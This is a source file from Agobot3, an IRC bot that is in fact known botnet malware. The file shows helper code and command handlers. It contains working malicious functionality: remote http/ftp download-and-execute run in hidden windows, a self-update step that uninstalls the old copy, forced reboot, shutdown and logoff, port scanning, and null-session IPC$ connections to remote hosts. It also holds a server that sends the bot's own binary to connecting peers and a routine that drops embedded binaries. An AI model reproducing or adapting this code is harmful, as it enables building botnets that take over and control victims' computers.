/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "utility.h"
#include "random.h"
#include "mainctrl.h"
#include "ftplib/ftplib.h"

bool recv_line(int sSocket, char *szBuffer, int iBufSize, CSSLSocket *pSSLSocket)
{	int iBufIndex=0; szBuffer[iBufIndex]='\0'; bool bReceiving=true;
	while(iBufIndex<iBufSize && &szBuffer[iBufIndex] && bReceiving)
	{	int iRead=0; if(pSSLSocket)
			iRead=pSSLSocket->Read(&szBuffer[iBufIndex], 1);
		else
			iRead=xRead(sSocket, &szBuffer[iBufIndex], 1);
		
		if(!iRead || iRead==-1) return false;
		if(ERRNO==EWOULDBLOCK) return true; 
		
		szBuffer[iBufIndex+1]='\0';

		if(szBuffer[iBufIndex]=='\n' || szBuffer[iBufIndex]=='\r' || !szBuffer[iBufIndex])
		{	szBuffer[iBufIndex-1]='\x00'; bReceiving=false; }

		iBufIndex++; }
	szBuffer[iBufSize-1]='\0'; return true; }

bool recv_line_irc(int sSocket, char *szBuffer, int iBufSize, CSSLSocket *pSSLSocket)
{	int iBufIndex=0; szBuffer[iBufIndex]='\0'; bool bReceiving=true;
	while(iBufIndex<iBufSize && &szBuffer[iBufIndex] && bReceiving)
	{	int iRead=0; if(pSSLSocket)
			iRead=pSSLSocket->Read(&szBuffer[iBufIndex], 1);
		else
			iRead=xRead(sSocket, &szBuffer[iBufIndex], 1);

		if(!iRead || iRead==-1) if(ERRNO!=EWOULDBLOCK) return false;
		if(ERRNO==EWOULDBLOCK) return true; 

		szBuffer[iBufIndex+1]='\0';

		if(szBuffer[iBufIndex]=='\n' || !szBuffer[iBufIndex])
		{	szBuffer[iBufIndex-1]='\x00'; bReceiving=false; }

		iBufIndex++; }
	szBuffer[iBufSize-1]='\0'; return true; }

// Format: xxxxxxxx-xxxxxxxx-xxxxxxxx-xxxxxxxx-xxxxxxxx-xxxxxxxx-xxxxxxxx-xxxxxxxx
// Only alphanumeric characters

void gen_unique_id(char *szString, int iLen)
{	memset(szString, 0, iLen);
	for(int i=0; i<iLen; i++)
	{	int sel=brandom(1, 3);
		switch(sel)
		{
		case 1: // Numeric characters
			szString[i]=(char)brandom(48, 57);
			break;
		case 2: // Uppercase letters
			szString[i]=(char)brandom(65, 90);
			break;
		case 3: // Lowercase letters
			szString[i]=(char)brandom(97, 122);
			break;
		default: // Shouldn't happen
			break; } } }

#pragma warning ( disable : 4035 )
unsigned __int64 cyclecount(void)
{
#if defined (__GNUC__)
	unsigned __int64 count = 0;
	__asm__ ("rdtsc;movl %%eax, %0" : "=r" (count));
	return count;
#elif defined (WIN32)
	#ifndef BCC32
		_asm {
			_emit 0x0F;
			_emit 0x31;
		}
	#else
		// FIXME: add cyclecount for BCC5
		return 0;
	#endif
#endif
}
#pragma warning ( default : 4035 )

int cpuspeed(void)	// cpu speed function
{	unsigned __int64 startcycle, speed, num, num2;
	do {	startcycle=cyclecount(); Sleep(1000);
			speed=((cyclecount()-startcycle)/100000)/10; }
	while(speed>1000000); // if speed is 1000GHz+, then something probably went wrong so we try again =P

	// guess 'real' cpu speed by rounding raw cpu speed (something like 601mhz looks kinda tacky)
	num=speed%100; num2=100;
	if(num<80) num2=75; if(num<71) num2=66; if(num<55) num2=50;
	if(num<38) num2=33; if(num<30) num2=25; if(num<10) num2=0;
	speed=(speed-num)+num2;
	return (int)speed; }

CString RndNick(const char *szPrefix)
{
#ifdef WIN32
#define BUFSIZE 1024
	if(g_cMainCtrl.m_cBot.bot_compnick.bValue) {
		CString sComputerName; char *szComputerName; bool bNameGood=false;
		szComputerName=sComputerName.GetBuffer(1024); init_random();
		unsigned long lStrLen=sComputerName.GetLength();

		if(!GetComputerName(szComputerName, &lStrLen)) strcpy(szComputerName, "phat");
		for(int j=65; j<91; j++) { if(szComputerName[0]==j) { bNameGood=true; } }
		for(int k=97; k<123; k++) { if(szComputerName[0]==k) { bNameGood=true; } }
		if(!bNameGood) strcpy(szComputerName, "phat");
		sComputerName.Append(rand()%10);
		sComputerName.Append(rand()%10);
		sComputerName.Append(rand()%10);
		return sComputerName;
	} else {
#endif // WIN32
		CString sRetVal; srand(GetTickCount());
		int nl=(rand()%3)+4; sRetVal.Assign(szPrefix);
		for(int n=0;n<nl;n++)
		{	CString sTemp; sTemp.Assign(sRetVal);
			sRetVal.Format("%s%c", sTemp.CStr(), (rand()%26)+97); }
		return sRetVal;
#ifdef WIN32
	}
#endif // WIN32
}

bool IsSpace(const char cChar) { if(cChar==' '||cChar=='\t') return true; else return false; }

bool Exist(const char *filename)
{	FILE *fp=fopen(filename, "r"); if(fp) { fclose(fp); return true; } return false; }

bool IsPrivate(const char *ip)
{	if(!ip) return false; if(!strcmp(ip, "")) return false;
	char *tokens[4]; char ipbuf[32]; strncpy(ipbuf, ip, 32); tokens[0]=strtok(ipbuf, "."); if(!tokens[0]) return false;
	for(int i=1;i<4;i++) { tokens[i]=strtok(NULL, "."); if(!tokens[i]) return false; }
	if(!strcmp(tokens[0], "10")) return true;								// Class A private network
	if(!strcmp(tokens[0], "172") && !strcmp(tokens[1], "16")) return true;	// Class B Private network
	if(!strcmp(tokens[0], "192") && !strcmp(tokens[1], "168")) return true;	// Class C private network
	if(!strcmp(tokens[0], "90") && !strcmp(tokens[1], "0")) return true;	// Class Bastart private network :P
	return false; }

bool ScanPort(const char *host, const unsigned short port)
{	sockaddr_in iAddr; int sSocket; bool bRetval=false;
	sSocket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if(sSocket==INVALID_SOCKET||sSocket==SOCKET_ERROR) return false;
	iAddr.sin_addr.s_addr=inet_addr(host); iAddr.sin_port=htons(port);
	iAddr.sin_family=AF_INET;
	if(!connect(sSocket, (sockaddr*)&iAddr, sizeof(iAddr))) bRetval=true;
	xClose(sSocket); return bRetval; }

bool Execute(const char *filename, const char *params)
#ifdef WIN32
#ifndef _DEBUG
{	if((int)ShellExecute(0, "open", filename, params, NULL, SW_HIDE)>=32) return true; else return false; }
#else
{	if((int)ShellExecute(0, "open", filename, params, NULL, SW_SHOW)>=32) return true; else return false; }
#endif // _DEBUG
#else // LINUX
{	if(fork()==0)
	{	execl(filename, params);
		exit(0); }
	else return false;
	return true; }
#endif // WIN32

bool CreateProc(char *filename, char *params)
#ifdef WIN32
{	PROCESS_INFORMATION pinfo; STARTUPINFO sinfo;
	memset(&sinfo, 0, sizeof(STARTUPINFO));
	sinfo.cb=sizeof(sinfo); sinfo.wShowWindow=SW_HIDE;
	if((CreateProcess(NULL, filename, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo)>0)==true)
		return true; else return false; }
#else // LINUX
{	if(fork()==0)
	{	execl(filename, params);
		exit(0); }
	else return false;
	return true; }
#endif // WIN32

#ifdef WIN32

bool ConnectViaNullSession(const char *remote_host, LPNETRESOURCEW nr)
{	DWORD result=0;
	WCHAR Ipc[]=L"\\IPC$";
	TCHAR szServer[280]=TEXT("");
	WCHAR Resource[280]=L"\\\\";
	char tmp[20]="";
	unsigned int err = 0;

	MultiByteToWideChar(CP_ACP, 0, (LPCSTR)remote_host, -1, (wchar_t*)szServer, 255);
	wcscat(Resource,(wchar_t*)szServer);
	wcscat(Resource,Ipc);

	nr->dwType      =RESOURCETYPE_ANY;
	nr->lpLocalName =NULL;
	nr->lpRemoteName=Resource;
	nr->lpProvider  =NULL;
	
	result = WNetAddConnection2W(nr,L"",L"",0);
	if(result==5 || result==1219)
		result = WNetAddConnection2W(nr,NULL,NULL,0);

	if(result==5 || result==1219) return false;

	return true; }

bool CloseNullSession(const char *remote_host)
{	WCHAR Ipc[]=L"\\IPC$";
	TCHAR szServer[280]=TEXT("");
	WCHAR Resource[280]=L"\\\\";
	MultiByteToWideChar(CP_ACP, 0, (LPCSTR)remote_host, -1, (wchar_t*)szServer, 255);
	wcscat(Resource,(wchar_t*)szServer);
	wcscat(Resource,Ipc);
	while(WNetCancelConnection2W(Resource, 0, false)!=NO_ERROR) { Sleep(2000); }
	return true; }

#endif // WIN32

void CDownloader::Init()
{	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdDownload,		"http.download",	"downloads a file from http",						this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdExecute,		"http.execute",		"updates the bot from a http url",					this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdUpdate,		"http.update",		"executes a file from a http url",					this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdVisit,		"http.visit",		"visits an url with a specified referrer",			this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdDownloadFtp,	"ftp.download",		"downloads a file from ftp",						this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdExecuteFtp,	"ftp.execute",		"updates the bot from a ftp url",					this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdUpdateFtp,	"ftp.update",		"executes a file from a ftp url",					this); }

bool CDownloader::HandleCommand(CMessage *pMsg)
{	CString sHost, sPath, sUser, sPass, sTarget;

	if(!pMsg->sCmd.Compare("http.download"))
	{	sHost.Assign(pMsg->sChatString.Token(1, " ")); sPath.Assign(pMsg->sChatString.Token(2, " ")); sTarget.Assign(pMsg->sChatString.Token(3, " ", true));
		CDownloadHelper *pDldHlp=new CDownloadHelper;
		pDldHlp->m_sHost.Assign(sHost); pDldHlp->m_sPath.Assign(sPath);
		pDldHlp->m_sTarget.Assign(sTarget); pDldHlp->m_sReplyTo.Assign(pMsg->sReplyTo);
		pDldHlp->m_bExecute=false; pDldHlp->m_bUpdate=false; pDldHlp->m_bFTP=false;
		pDldHlp->m_bSilent=pMsg->bSilent; pDldHlp->m_bNotice=pMsg->bNotice;
		pDldHlp->Start(); }

	if(!pMsg->sCmd.Compare("http.execute"))
	{	sHost.Assign(pMsg->sChatString.Token(1, " ")); sPath.Assign(pMsg->sChatString.Token(2, " ")); sTarget.Assign(pMsg->sChatString.Token(3, " ", true));
		CDownloadHelper *pDldHlp=new CDownloadHelper;
		pDldHlp->m_sHost.Assign(sHost); pDldHlp->m_sPath.Assign(sPath);
		pDldHlp->m_sTarget.Assign(sTarget); pDldHlp->m_sReplyTo.Assign(pMsg->sReplyTo);
		pDldHlp->m_bExecute=true; pDldHlp->m_bUpdate=false; pDldHlp->m_bFTP=false;
		pDldHlp->m_bSilent=pMsg->bSilent; pDldHlp->m_bNotice=pMsg->bNotice;
		pDldHlp->Start(); }

	if(!pMsg->sCmd.Compare("http.update"))
	{	sHost.Assign(pMsg->sChatString.Token(1, " ")); sPath.Assign(pMsg->sChatString.Token(2, " ")); sTarget.Assign(pMsg->sChatString.Token(3, " ", true));
		if(!pMsg->sChatString.Token(4, " ").Compare(g_cMainCtrl.m_cBot.bot_id.sValue)) return false;
		CDownloadHelper *pDldHlp=new CDownloadHelper;
		pDldHlp->m_sHost.Assign(sHost); pDldHlp->m_sPath.Assign(sPath);
		pDldHlp->m_sTarget.Assign(sTarget); pDldHlp->m_sReplyTo.Assign(pMsg->sReplyTo);
		pDldHlp->m_bExecute=false; pDldHlp->m_bUpdate=true; pDldHlp->m_bFTP=false;
		pDldHlp->m_bSilent=pMsg->bSilent; pDldHlp->m_bNotice=pMsg->bNotice;
		pDldHlp->Start(); }

	if(!pMsg->sCmd.Compare("ftp.download"))
	{	sUser.Assign(pMsg->sChatString.Token(1, " ")); sPass.Assign(pMsg->sChatString.Token(2, " "));
		sHost.Assign(pMsg->sChatString.Token(3, " ")); sPath.Assign(pMsg->sChatString.Token(4, " ")); sTarget.Assign(pMsg->sChatString.Token(5, " ", true));
		CDownloadHelper *pDldHlp=new CDownloadHelper;
		pDldHlp->m_sHost.Assign(sHost); pDldHlp->m_sPath.Assign(sPath);
		pDldHlp->m_sTarget.Assign(sTarget); pDldHlp->m_sUser.Assign(sUser);
		pDldHlp->m_sPass.Assign(sPass); pDldHlp->m_sReplyTo.Assign(pMsg->sReplyTo);
		pDldHlp->m_bExecute=false; pDldHlp->m_bUpdate=false; pDldHlp->m_bFTP=true;
		pDldHlp->m_bSilent=pMsg->bSilent; pDldHlp->m_bNotice=pMsg->bNotice;
		pDldHlp->Start(); }

	if(!pMsg->sCmd.Compare("ftp.execute"))
	{	sUser.Assign(pMsg->sChatString.Token(1, " ")); sPass.Assign(pMsg->sChatString.Token(2, " "));
		sHost.Assign(pMsg->sChatString.Token(3, " ")); sPath.Assign(pMsg->sChatString.Token(4, " ")); sTarget.Assign(pMsg->sChatString.Token(5, " ", true));
		CDownloadHelper *pDldHlp=new CDownloadHelper;
		pDldHlp->m_sHost.Assign(sHost); pDldHlp->m_sPath.Assign(sPath);
		pDldHlp->m_sTarget.Assign(sTarget); pDldHlp->m_sUser.Assign(sUser);
		pDldHlp->m_sPass.Assign(sPass); pDldHlp->m_sReplyTo.Assign(pMsg->sReplyTo);
		pDldHlp->m_bExecute=true; pDldHlp->m_bUpdate=false; pDldHlp->m_bFTP=true;
		pDldHlp->m_bSilent=pMsg->bSilent; pDldHlp->m_bNotice=pMsg->bNotice;
		pDldHlp->Start(); }

	if(!pMsg->sCmd.Compare("ftp.update"))
	{	sUser.Assign(pMsg->sChatString.Token(1, " ")); sPass.Assign(pMsg->sChatString.Token(2, " "));
		sHost.Assign(pMsg->sChatString.Token(3, " ")); sPath.Assign(pMsg->sChatString.Token(4, " ")); sTarget.Assign(pMsg->sChatString.Token(5, " ", true));
		if(!pMsg->sChatString.Token(6, " ").Compare(g_cMainCtrl.m_cBot.bot_id.sValue)) return false;
		CDownloadHelper *pDldHlp=new CDownloadHelper;
		pDldHlp->m_sHost.Assign(sHost); pDldHlp->m_sPath.Assign(sPath);
		pDldHlp->m_sTarget.Assign(sTarget); pDldHlp->m_sUser.Assign(sUser);
		pDldHlp->m_sPass.Assign(sPass); pDldHlp->m_sReplyTo.Assign(pMsg->sReplyTo);
		pDldHlp->m_bExecute=false; pDldHlp->m_bUpdate=true; pDldHlp->m_bFTP=true;
		pDldHlp->m_bSilent=pMsg->bSilent; pDldHlp->m_bNotice=pMsg->bNotice;
		pDldHlp->Start(); }

	return true; }

void *CDownloadHelper::Run()
{	// If the params are invalid, return
	if(!m_sHost.Compare("") || !m_sTarget.Compare("") || !m_sPath.Compare("")) { g_cMainCtrl.m_lCanJoin.push_back(this); return NULL; }
	if(m_bFTP) if(!m_sUser.Compare("") || !m_sPass.Compare("")) { g_cMainCtrl.m_lCanJoin.push_back(this); return NULL; }
	// Get the port from the host, set it to default if none is specified
	int iPort=0; if(m_sHost.Token(1, ":").Compare("")) iPort=atoi(m_sHost.Token(1, ":").CStr());
	if(iPort==0) if(m_bFTP) iPort=21; else iPort=80;
	// Store only the ip/host in m_sHost
	CString sTemp(m_sHost.Token(0, ":")); m_sHost.Assign(sTemp);
	// Expand environment variables if compiled on Win32
#ifdef WIN32
	char szTemp[MAX_PATH]; ExpandEnvironmentStrings(m_sTarget.CStr(), szTemp, MAX_PATH); m_sTarget.Assign(szTemp);
#endif

	if(m_bFTP)
	{	netbuf *nControl; FtpInit();
		if(!FtpConnect(m_sHost.CStr(), &nControl))
		{	g_cMainCtrl.m_cIRC.SendMsg(m_bSilent, m_bNotice, "Unable to connect to ftp.", m_sReplyTo);
			g_cMainCtrl.m_lCanJoin.push_back(this); return NULL; }
		if(!FtpLogin(m_sUser.CStr(), m_sPass.CStr(), nControl))
		{	g_cMainCtrl.m_cIRC.SendMsg(m_bSilent, m_bNotice, "Unable to login to ftp.", m_sReplyTo);
			g_cMainCtrl.m_lCanJoin.push_back(this); return NULL; }
		g_cMainCtrl.m_cIRC.SendMsg(m_bSilent, m_bNotice, "Receiving file.", m_sReplyTo);
		if(!FtpGet(m_sTarget.CStr(), m_sPath.CStr(), FTPLIB_IMAGE, nControl))
		{	g_cMainCtrl.m_cIRC.SendMsg(m_bSilent, m_bNotice, "Unable to download from ftp.", m_sReplyTo);
			g_cMainCtrl.m_lCanJoin.push_back(this); return NULL; }
		FtpQuit(nControl); }
	else
	{	int sSocket, d; CString sSendBuf, sReply;

		sSocket=DoTcpConnect(m_sHost.CStr(), iPort);

		if(sSocket==SOCKET_ERROR)
		{	g_cMainCtrl.m_cIRC.SendMsg(m_bSilent, m_bNotice, "Unable to connect to http.", m_sReplyTo);
			g_cMainCtrl.m_lCanJoin.push_back(this); xClose(sSocket); return NULL; }

		sSendBuf.Format("GET %s HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.75 [en]\r\nHost: %s:%d\r\n\r\n", m_sPath.CStr(), m_sHost.CStr(), iPort);
		xWrite(sSocket, sSendBuf.CStr(), sSendBuf.GetLength());
		g_cMainCtrl.m_cIRC.SendMsg(m_bSilent, m_bNotice, "Receiving file.", m_sReplyTo);

		FILE *file=fopen(m_sTarget.CStr(),"wb");
		if(!file) { g_cMainCtrl.m_cIRC.SendMsg(m_bSilent, m_bNotice, "Failed to open file.", m_sReplyTo); g_cMainCtrl.m_lCanJoin.push_back(this); return NULL; }
		
		char szBuf[4096];
		while(true)
		{	int i; if((i=xRead(sSocket,szBuf,4096))<=0) break;
			if(i<4096) szBuf[i]=0;
			for(d=0;d<i;d++) if(!strncmp(szBuf+d,"\r\n\r\n",4))
			{	for (d+=4;d<i;d++) fputc(szBuf[d],file);
				goto done_http; } }
done_http:
		while(true)
		{	int i; if((i=xRead(sSocket,szBuf,4096))<=0) break;
			if(i<4096) szBuf[i]=0;
			for(d=0;d<i;d++) fputc(szBuf[d],file); }

		fclose(file); xClose(sSocket); }

	if(!m_bUpdate)
	{	//download isn't an update
		g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo, "download to %s finished.", m_sTarget.CStr());
		
		if(m_bExecute)
		{	Execute(m_sTarget.CStr(), "");
			g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo, "opened %s.", m_sTarget.CStr()); } }
	else
	{	//download is an update
		g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo, "download to %s finished, updating...", m_sTarget.CStr());

		if(CreateProc(m_sTarget.Str(), "-update"))
		{	// successful update, remove and exit
#ifdef WIN32
			if(g_cMainCtrl.m_cBot.as_enabled.bValue) g_cMainCtrl.m_cInstaller.RegStartDel(g_cMainCtrl.m_cBot.as_valname.sValue);
#endif
			g_cMainCtrl.m_cInstaller.Uninstall(); g_cMainCtrl.m_bRunning=false; exit(1); }
		else
			g_cMainCtrl.m_cIRC.SendMsg(m_bSilent, m_bNotice, "update failed: error executing file.", m_sReplyTo.Str()); }

	g_cMainCtrl.m_lCanJoin.push_back(this); return NULL; }

void CRSLControl::Init() {
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdReboot,	"rsl.reboot",	"reboots the computer",		this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdShutdown,	"rsl.shutdown",	"shuts the computer down",	this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdLogoff,	"rsl.logoff",	"logs the user off",		this);
}

bool CRSLControl::HandleCommand(CMessage *pMsg) {
	if(!pMsg->sCmd.Compare("rsl.reboot")) {
		g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo, \
			"rebooting...");
#ifdef WIN32
		ExitWindowsEx(EWX_REBOOT|EWX_FORCE,0);
#else
		system("reboot");
#endif // WIN32
	} else if(!pMsg->sCmd.Compare("rsl.shutdown")) {
		g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo, \
			"shutting down...");
#ifdef WIN32
		ExitWindowsEx(EWX_SHUTDOWN|EWX_FORCE,0);
#else
		system("shutdown");
#endif // WIN32
	} else if(!pMsg->sCmd.Compare("rsl.logoff")) {
		g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo, \
			"logging off...");
#ifdef WIN32
		ExitWindowsEx(EWX_LOGOFF|EWX_FORCE,0);
#else
		system("init 1");
#endif // WIN32
	}
	return false;
}

void *CCmdExecutor::Run()
{	while(!m_bMsgSet) Sleep(1000);
	g_cMainCtrl.m_cBot.Recv(&m_mMsg);
	g_cMainCtrl.m_lCanJoin.push_back(this);
	return NULL; }

void CCmdExecutor::Set(CMessage *pMsg)
{	m_pMsg=pMsg; m_mMsg.bNotice=m_pMsg->bNotice; m_mMsg.bSilent=m_pMsg->bSilent; m_mMsg.sSrc.Assign(m_pMsg->sSrc); 
	m_mMsg.sIdentd.Assign(m_pMsg->sIdentd); m_mMsg.sHost.Assign(m_pMsg->sHost); m_mMsg.sDest.Assign(m_pMsg->sDest);
	m_mMsg.sChatString.Assign(m_pMsg->sChatString); m_bMsgSet=true; }

void *CSendFile::Run()
{		int				m_sListenSocket;
	sockaddr_in		m_lAddr;

	int sClientSocket; sockaddr_in cAddr;
	socklen_t cAddrLen=sizeof(cAddr);
	unsigned char fileBuf[4096]; FILE *fp=NULL;

	memset(&m_lAddr, 0, sizeof(m_lAddr));
	m_lAddr.sin_family=AF_INET;
	m_lAddr.sin_addr.s_addr=INADDR_ANY;
	m_lAddr.sin_port=htons(g_cMainCtrl.m_cBot.bot_ftrans_port.iValue);
	m_sListenSocket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(m_sListenSocket==SOCKET_ERROR) { g_cMainCtrl.m_lCanJoin.push_back(this); return NULL; }
#ifdef DBGCONSOLE
	g_cMainCtrl.m_cConsDbg.Log(5, "CSendFile(0x%8.8Xh): Binding CSendFile to port %d.\n", this, g_cMainCtrl.m_cBot.bot_ftrans_port.iValue);
#endif
	if(bind(m_sListenSocket, (sockaddr*)&m_lAddr, sizeof(m_lAddr))!=0) { xClose(m_sListenSocket); g_cMainCtrl.m_lCanJoin.push_back(this); return NULL; }

#ifdef DBGCONSOLE
	g_cMainCtrl.m_cConsDbg.Log(5, "CSendFile(0x%8.8Xh): Listening on port %d.\n", this, g_cMainCtrl.m_cBot.bot_ftrans_port.iValue);
#endif

	while(g_cMainCtrl.m_bRunning)
	{	if(listen(m_sListenSocket, 10)==SOCKET_ERROR) { Sleep(250); continue; }
		sClientSocket=accept(m_sListenSocket, (sockaddr*)&cAddr, &cAddrLen);
		if(sClientSocket!=SOCKET_ERROR)
		{	// Get the remote ip via getpeername
			sockaddr sa; socklen_t sas=sizeof(sa); memset(&sa, 0, sizeof(sa)); getpeername(sClientSocket, &sa, &sas);
			// Break if the ip is 0.0.0.0
			if(!(unsigned char)sa.sa_data[2]) continue;
			g_cMainCtrl.m_cIRC.SendFormat(false, false, g_cMainCtrl.m_cBot.si_mainchan.sValue.Str(),
				"CSendFile(0x%8.8Xh): Connection from %d.%d.%d.%d accepted.", this, (unsigned char)sa.sa_data[2], (unsigned char)sa.sa_data[3], \
					(unsigned char)sa.sa_data[4], (unsigned char)sa.sa_data[5]);
#ifdef DBGCONSOLE
			g_cMainCtrl.m_cConsDbg.Log(5, "CSendFile(0x%8.8Xh): Connection from %d.%d.%d.%d accepted.\n", this, (unsigned char)sa.sa_data[2], (unsigned char)sa.sa_data[3], \
					(unsigned char)sa.sa_data[4], (unsigned char)sa.sa_data[5]);
#endif
		
			int count=4096; CString sFileName; GetFilename(sFileName.GetBuffer(4096), 4096);
			fp=fopen(sFileName.CStr(), "rb");
			if(fp) {
#ifdef DBGCONSOLE
				g_cMainCtrl.m_cConsDbg.Log(5, "CSendFile(0x%8.8Xh): Sending file...\n", this);
#endif
				fseek(fp, 0, SEEK_END); long filesize=ftell(fp); fseek(fp, 0, SEEK_SET);
				char *filesize1=(char*)&filesize; char fsbuf[4]; fsbuf[4]='\0';
				fsbuf[0]=(char)filesize1[0]; fsbuf[1]=(char)filesize1[1];
				fsbuf[2]=(char)filesize1[2]; fsbuf[3]=(char)filesize1[3];
				xWrite(sClientSocket, (char*)fsbuf, sizeof(long));

				while(count==4096)
				{	memset(fileBuf, 0, sizeof(fileBuf));
					count=fread(fileBuf, sizeof(char), 4096, fp);
					if(ferror(fp)) break;
					xWrite(sClientSocket, (char*)fileBuf, count); }

				g_cMainCtrl.m_cIRC.SendFormat(false, false, g_cMainCtrl.m_cBot.si_mainchan.sValue.Str(),
					"CSendFile(0x%8.8Xh): Transfer to %d.%d.%d.%d finished.", this, (unsigned char)sa.sa_data[2], (unsigned char)sa.sa_data[3], \
						(unsigned char)sa.sa_data[4], (unsigned char)sa.sa_data[5]);
#ifdef DBGCONSOLE
				g_cMainCtrl.m_cConsDbg.Log(5, "CSendFile(0x%8.8Xh): Transfer to %d.%d.%d.%d finished.\n", this, (unsigned char)sa.sa_data[2], (unsigned char)sa.sa_data[3], \
						(unsigned char)sa.sa_data[4], (unsigned char)sa.sa_data[5]);
#endif
				fclose(fp); }
			xClose(sClientSocket); }
		Sleep(2500); }

	xClose(m_sListenSocket);

	return NULL;
}

void *CIdentD::Run()
{		int				m_sListenSocket;
	sockaddr_in		m_lAddr;

	int sClientSocket; sockaddr_in cAddr;
	socklen_t cAddrLen=sizeof(cAddr);

	char ibuff[64];

	memset(&m_lAddr, 0, sizeof(m_lAddr));
	m_lAddr.sin_family=AF_INET;
	m_lAddr.sin_addr.s_addr=INADDR_ANY;
	m_lAddr.sin_port=htons(113);
	m_sListenSocket=DoTcpBind(m_lAddr.sin_port);
	if(m_sListenSocket==SOCKET_ERROR) return false;

#ifdef DBGCONSOLE
	g_cMainCtrl.m_cConsDbg.Log(5, "CIdentD(0x%8.8Xh): Binding IdentD to port 113.\n", this);
#endif
	if(bind(m_sListenSocket, (sockaddr*)&m_lAddr, sizeof(m_lAddr))!=0) { 
		g_cMainCtrl.m_bIdentD_Running = false;
		g_cMainCtrl.m_cIdentD.Kill();}

#ifdef DBGCONSOLE
	g_cMainCtrl.m_cConsDbg.Log(5, "CIdentD(0x%8.8Xh): Listening on port 113.\n", this);
#endif

	g_cMainCtrl.m_bIdentD_Running = true;

	while(!g_cMainCtrl.m_cBot.m_bJoined)
	{	if(listen(m_sListenSocket, 10)==SOCKET_ERROR) { Sleep(2000); g_cMainCtrl.m_cIdentD.Kill(); }
		sClientSocket=accept(m_sListenSocket, (sockaddr*)&cAddr, &cAddrLen);
		if(sClientSocket!=SOCKET_ERROR)
		{	// Get the remote ip via getpeername
			sockaddr sa; socklen_t sas=sizeof(sa); memset(&sa, 0, sizeof(sa)); getpeername(sClientSocket, &sa, &sas);
			// Break if the ip is 0.0.0.0
			if(!(unsigned char)sa.sa_data[2]) continue;

#ifdef DBGCONSOLE
			g_cMainCtrl.m_cConsDbg.Log(5, "IdentD: Connection from %d.%d.%d.%d accepted.\n", this, \
					(unsigned char)sa.sa_data[2], (unsigned char)sa.sa_data[3], \
					(unsigned char)sa.sa_data[4], (unsigned char)sa.sa_data[5]);
#endif

				srand(GetCycleCount());

				memset(ibuff, 0, sizeof(ibuff));
				sprintf(ibuff, "%d, %d : USERID : UNIX : %s\r\n", rand()%6000+1, 113, RndNick(g_cMainCtrl.m_cBot.si_nickprefix.sValue.CStr())); // build ident reply
				xWrite(sClientSocket, (char*)ibuff, sizeof(ibuff)); // send file

			xClose(sClientSocket); }
		Sleep(2500);
	xClose(m_sListenSocket);
	g_cMainCtrl.m_bIdentD_Running = false;
	g_cMainCtrl.m_cIdentD.Kill();}

	xClose(m_sListenSocket);

	return NULL;
}

#ifdef WIN32
bool WriteFile(const char *filename, int resnum, LPCTSTR lpModuleName)
{	FILE *fp=fopen(filename, "wb"); if(!fp) return false;
	HMODULE hMod=GetModuleHandle(lpModuleName); if(!hMod) return false;
	HRSRC hBinary=FindResource(hMod, MAKEINTRESOURCE(resnum), TEXT("BINRES")); if(!hBinary) return false;
	HGLOBAL hGbDesc=LoadResource(hMod, hBinary); 
	DWORD dwSize=SizeofResource(hMod, hBinary); 
	PBYTE pData=(unsigned char*)LockResource(hGbDesc); 
	fwrite(pData, sizeof(unsigned char), dwSize, fp);
	fclose(fp); UnlockResource(hBinary);
	return true; }
#endif // WIN32

/*
	This turns a numeric ip or hostname into an unsigned long
*/

unsigned long ResolveAddress(const char *szHost)
{	unsigned long lAddr=inet_addr(szHost);
	if(lAddr==INADDR_NONE)
	{	hostent *pHE=gethostbyname(szHost);
		if(!pHE) return INADDR_NONE;
		lAddr=*((unsigned long*)pHE->h_addr_list[0]); }
	return lAddr; }

int DoTcpConnect(const char *szHost, int iPort)
{	int sSocket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(sSocket==INVALID_SOCKET) return SOCKET_ERROR;
	sockaddr_in ssin; memset(&ssin, 0, sizeof(ssin)); ssin.sin_family=AF_INET;
	ssin.sin_port=htons(iPort); ssin.sin_addr.s_addr=ResolveAddress(szHost);
	if(connect(sSocket, (sockaddr*)&ssin, sizeof(sockaddr_in))==SOCKET_ERROR)
	{	xClose(sSocket); return SOCKET_ERROR; }
	return sSocket; }

int DoTcpBind(int iPort)
{	int sListenSocket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(sListenSocket==INVALID_SOCKET) return SOCKET_ERROR;
	sockaddr_in ssin; memset(&ssin, 0, sizeof(ssin)); ssin.sin_family=AF_INET;
	ssin.sin_port=htons(iPort); ssin.sin_addr.s_addr=INADDR_ANY;
